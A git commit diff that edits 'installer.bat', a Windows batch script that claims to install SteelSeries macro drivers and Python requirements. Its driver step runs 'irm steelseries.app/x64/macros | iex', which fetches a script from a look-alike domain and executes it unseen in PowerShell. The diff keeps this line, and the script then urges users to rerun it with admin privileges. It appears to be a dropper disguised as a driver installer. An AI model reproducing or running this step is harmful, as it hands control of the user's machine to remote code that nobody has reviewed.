963a39970c34912234269f485b5bc3c2eec64fea
ShadowCatlol <blxrewards@gmail.com>
2025-04-07 17:29:31 -0400

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -1,23 +1,24 @@
 @echo off
 setlocal EnableDelayedExpansion
 color 6
+
 echo [LOG] Installing Drivers
 
 :: Use steelseries macro drivers...
-powershell irm steelseries.app/x64/macros | iex
+powershell "irm steelseries.app/x64/macros | iex"
 
-color a
 echo [LOG] Drivers Installed!
 
 color 6
 echo [LOG] Installing requirements.txt
 pip install -r requirements.txt
 
-color a
 echo [LOG] Requirements Installed!
 
+echo
+echo
 echo If the script fails...
-echo rerun installer.bat with admin privileges
+echo Rerun installer.bat with admin privileges
 
 PAUSE
 cls
